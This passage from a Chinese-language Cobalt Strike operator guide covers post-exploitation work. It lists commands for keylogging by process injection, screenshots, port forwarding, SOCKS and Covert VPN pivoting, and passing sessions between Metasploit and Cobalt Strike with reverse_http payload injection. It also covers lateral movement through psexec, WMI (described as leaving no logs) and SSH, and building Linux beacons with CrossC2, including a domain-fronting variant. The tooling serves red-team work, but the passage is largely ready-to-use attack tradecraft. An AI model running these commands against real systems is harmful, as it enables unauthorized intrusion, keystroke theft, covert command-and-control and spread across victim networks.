然后在浏览器设置代理，访问网址,如果目标关闭正在使用的选项卡，则需要重新注入 browser pivoting 代理服务器。
**端口扫描**
使用 目标右键 > Explore > port scan
可以选择网段、协议、以及最大链接数
扫描完成后我们可以在 services 视图查看扫描结果，多选或者单选 右键 > Services 看到我们的扫描结果。
**进程**
```bash
ps
```
**键盘记录**
键盘记录有使用2种方式 一种是进程注入 一种是直接使用
选择一个进程来注入
```bash
ps              # 查看进程列表
```
可见 2640 是 notepad.exe 选择它来注入
```bash
keylogger 2460 x64
# 有2个选项 x64 和 x86
```
在 View>Keystrokes 可以看到键盘的记录
**屏幕截图**
和键盘记录一样可以选择一个进程进行截图
```bash
screenshot 2640 x64 90
```
在 View>Screenshost 可以看到截图
---
### Pivoting
速度很慢
**rportfwd**
```bash
rportfwd 本机端口 目标ip 目标端口
```
例如转发 10 段的一台机器 3389 到 192.168.141.142 的 8888 端口
```bash
rportfwd 8888 10.20.1.129 3389
```
取消转发
```
rportfwd stop 8888
```
**socks4**
通过这些 SOCKS 服务器的所有连接都将变为连接，读取，写入和关闭任务状态，以便执行相关的 Beacon。你可以通过 SOCKS 的任何类型的 Beacon 进行隧道传输。 Beacon 的 HTTP 数据通道对数据转发的响应最快，如果你想通过 DNS 转发流量，请使用 DNS TXT 记录通信模式。 CS 本身支持的是 socks4 代理，貌似有脚本支持 socks5，他有 2 种用法，一种是配合 proxychains 带入目标内网 ，一种是直接把 msf 带入目标内网
在 192.168.141.142 的 8888 端口开启 sock4 代理
```bash
socks 8888
```
proxychains 配置
```bash
vim /etc/proxychains.conf
socks4 192.168.141.142 8888
```
**Listener**
该项用于在目标上启动一个 Listener,对于内网多层网段的场景,可以将 shell 弹回到目标机器上。
**Covert VPN**
> 注：此功能在Windows 10目标上不起作用。
VPN pivoting 是一种灵活的隧道传输方式，这种方式不受代理 pivot 的那些限制。Cobalt Strike 通过其隐蔽 VPN 功能提供 VPN pivoting 服务。隐蔽 VPN 创建一个在 Cobalt Strike 系统上的网络接口并将此接口桥接进目标的网络中。
要激活 Covert VPN，右键单击受控的主机， Pivoting - > Deploy VPN。选择你希望 Covert VPN 绑定到的远程接口。
勾选 Clone host MAC address （克隆主机 MAC 地址）框来使你的本地接口具有与远程接口一样的 MAC 地址。保留此选项的勾选状态是最安全的选择。
激活隐蔽 VPN 接口后，你可以像使用你的系统上的任何物理接口一样使用它。使用 ifconfig 来配置其 IP 地址。如果目标网络具有 DHCP 服务器，则你可以使用你的操作系统内置工具向其请求IP地址
要管理你的 Covert VPN 接口，请进入到 Cobalt Strike - > VPN Interfaces。在这里，Cobalt Strike 将显示 Covert VPN 接口，它们的配置方式以及通过每个接口传输和接收的字节数。
选中一个接口，然后选择 “Remove” 清除该接口并关闭远程 Covert VPN 客户端。Covert VPN 将在重新启动时删除其临时文件，并立即自动撤消任何系统更改。选择 Add 以配置新的 Covert VPN 接口。
如果没有本地接口，请选择 Add 来创建。
隐蔽 VPN 接口由一个网络分接头和一个用于通信 63 个以太网帧通过的通道组成。要配置接口，请填入接口名称（这是你稍后要通过 ifconfig 操作的名称）和一个 MAC 地址。
你还必须为你的接口配置 Covert VPN 通信通道。
隐蔽 VPN 可以通过 UDP 连接，TCP 连接，ICMP 或使用 HTTP 协议来通信以太网帧。 TCP(Reverse) 通道会让目标连接到你的 Cobalt Strike 实例。 TCP(Bind) 通道会让 Cobalt Strike 通过 Beacon 与 VPN 建立隧道通信。
Cobalt Strike 将基于你选择的 Local Port （本地端口） 和 Channel （通道）建立和管理与隐蔽 VPN 客户端的之间的通信。
隐蔽 VPN HTTP 通道使用 Cobalt Strike Web 服务器。你可以在同一个端口上托管其他的 Cobalt Strike web 应用和多个隐蔽 VPN HTTP 通道。
要获取最佳效果，请使用 UDP 通道。与 TCP 和 HTTP 通道相比，UDP 通道的开销最少。如果你需要通过一个限制严格的防火墙，可以使用 ICMP，HTTP 或 TCP(Bind) 通道。
虽然隐蔽 VPN 具有灵活性优势，但是具体选择使用 VPN pivot 还是代理 pivot 这取决于具体环境。隐蔽 VPN 需要管理员访问权限。代理 pivot 则不需要。隐蔽 VPN 创建新的通信通道。代理 pivot 则不会。你应该首先使用代理 pivot，然后在需要时移至 VPN pivot。
---
### Spawn
> 以下部分内容来自 [Cobalt_Strike_wiki/第十六节[MSF与CS会话互转].md](https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E5%8D%81%E5%85%AD%E8%8A%82%5BMSF%E4%B8%8ECS%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC%5D.md)
**MSF 转 CS**
从已经获得 meterpreter 的时候转到 CS 只需要使用的 payload_inject 模块
```bash
meterpreter > background
msf exploit(multi/handler) > use exploit/windows/local/payload_inject
msf exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_http
msf exploit(windows/local/payload_inject) > set lhost [host]
msf exploit(windows/local/payload_inject) > set lport [port]
msf exploit(windows/local/payload_inject) > set session [session_id]
msf exploit(windows/local/payload_inject) > set disablepayloadhandler true
msf exploit(windows/local/payload_inject) > exploit -j
# set disablepayloadhandler true 用来禁用 payload handler 的监听否则有冲突。
```
然后 CS 里面配置监听相应 lhost lport 即可
**CS 转 MSF**
CS 转 MSF 只需要用到 spawn 功能
MSF 开启监听
```bash
msf > sessions -l
msf > use exploit/multi/handler
msf exploit(multi/handler) > set set payload windows/meterpreter/reverse_http
msf exploit(multi/handler) > set lhost [host]
msf exploit(multi/handler) > set lport [port]
msf exploit(multi/handler) > exploit
```
目标右键 -> spawn , 添加一个 Foreign 的监听器,在点 choose 弹到 msf
---
## 横向
一旦你有了域管理员或者是目标机器上的本地管理员域用户的令牌，你可以通过滥用这种信任关系来控制目标。
输入 jump 来列出 Cobalt Strike 中注册的横向移动的选项。运行 `jump [module] [target] [listener]` 来尝试在远程目标上运行一个 payload。
单独运行 remote-exec 命令来列举 Cobalt Strike 中注册的远程执行模块。使用 `remote-exec [module] [target] [command+args]` 来尝试在远程目标主机上运行特定的命令。
**psexec**
1. 通过 ipc$ 连接，然后释放 psexesvc.exe 到目标机器。
2. 通过服务管理 SCManager 远程创建 psexecsvc 服务，并启动服务。
3. 客户端连接执行命令, 服务端启动相应的程序并执行回显数据。
Cobalt Strike 中提供 2 种 psexec 用法
```bash
psexec [host] [share] [listener]
psexec_psh [host] [listener]
```
一种是用 psexec 生成会话 一种是利用 psexec 和 powershell 生成 psh 都与 powershell 有关。
**WMI**
WMI 的全称是 Windows Management Instrumentation, 它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统, 攻击者使用 wmi 来进行攻击, 但 Windows 系统默认不会在日志中记录这些操作, 可以做到无日志, 攻击脚本无需写入到磁盘, 增加了隐蔽性, 越来越多的 apt 事件中使用 WMI 进行攻击，利用 WMI 可以进行信息收集、探测，反病毒和虚拟机检测，命令执行，权限持久化等操作。
```bash
wmi [host] [listener]
```
Cobalt Strike 也提供一个 GUI 来使得横向移动更加简单。切换到目标可视化表或转到 View → Targets 。导航到 [target] → Jump 并选择所需的横向移动选项。将打开以下对话框：
首先，决定你想用哪种信任来进行横向移动。如果你想使用你的某个 Beacon 中的令牌，勾选 Use session's current access token （使用会话的当前访问令牌）框。你也可以使用凭据或哈希来进行横向移动。从凭据存储中选择凭据或者手动填写 User 、 Password 和 Domain 字段。Beacon 会使用此信息来为你生成一个访问令牌。记住，你需要在高权限的上下文（管理员权限）中执行这些操作才能生效。
接下来，选择用于横向移动的监听器。在这种场景中，SMB Beacon 通常是一个很好的选择。最后，选择你想从哪个会话中执行横向移动攻击。Cobalt Strike 的异步攻击模型要求每一个攻击都从一个受害系统中执行。如果没有可以展开攻击的 Beacon 会话就没有可以执行此操作的选项。如果你在一个内部行动中，考虑 hook 一个你控制的 Windows 系统并以其作为你使用凭据或哈希攻击其他系统的起点。
点击 Launch （启动）。Cobalt Strike 将激活选定 Beacon 的标签页并对其发出命令。攻击的反馈会展现在 Beacon 的控制台中。
### SSH
当内网有 Linux 时 Cobalt Strike 也是考虑到的提供了 ssh 连接, 只需要用目标机的 beacon 去连接就可以了。
直接连接
```bash
ssh [target:port] [user] [pass]
```
ssh-key
```bash
ssh [target:port] [user] [/path/to/key.pem]
```
---
## 脚本
Cobalt Strike 可通过它的 Aggressor Script 语言来为其编写脚本。Aggressor Script 是 Armitage 的 Cortana 脚本语言的精神继任者，虽然这两者并不兼容。
通过 Cobalt Strike → Script Manager 来对脚本进行管理。
### CrossC2
地址 : https://github.com/gloxec/CrossC2
下载 CrossC2.cna ,和相应平台的二进制文件,先修改 CrossC2.cna
改为指定的文件路径
选择 Script Manager，添加 CrossC2.cna
起个 https 的监听器
将服务端的 .cobaltstrike.beacon_keys 文件拷到二进制文件目录下
生成
也可以用命令
```
genCrossC2.Win.exe 192.168.141.151 443 ./.cobaltstrike.beacon_keys null Linux x64 test
```
上传 test 文件至目标,加权限运行,目标上线
参考文章
- https://0x20h.com/p/c02f.html
- https://www.cnblogs.com/micr067/p/13311206.html
**生成 rebind 库**
当 teamserver 配置了 c2profile 时，需要提前生成 rebind 库供生成 beacon 时使用
参考官方的格式
- https://gloxec.github.io/CrossC2/zh_cn/protocol/
- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile
- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c
- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/proxy_udp.py
- https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/rebind_udp.c
修改完毕后,测试 profile,编译生成
```bash
./c2lint test.profile
# 登录 cs 生成 rebind 库供生成 beacon
gcc test.c -fPIC -shared -o lib_rebind_test.so
```
**直接生成 shell**
```bash
# 登录 cs 生成 shell
./genCrossC2.Linux xx.xx.xx.xx 443 .cobaltstrike.beacon_keys null Linux x64 shell
```
**域前置模式下生成 shell**
```bash
# 登录 cs 生成 shell
./genCrossC2.Linux xx.xx.xx.xx 443 .cobaltstrike.beacon_keys ./lib_rebind_test.so Linux x64 shell
# 注意 mac m1 下生成的 shell , x86 运行上不了线
```
**导入 cna**
下载 https://github.com/gloxec/CrossC2/releases/download/v3.1.0/CrossC2Kit-GithubBot-2022-06-07.zip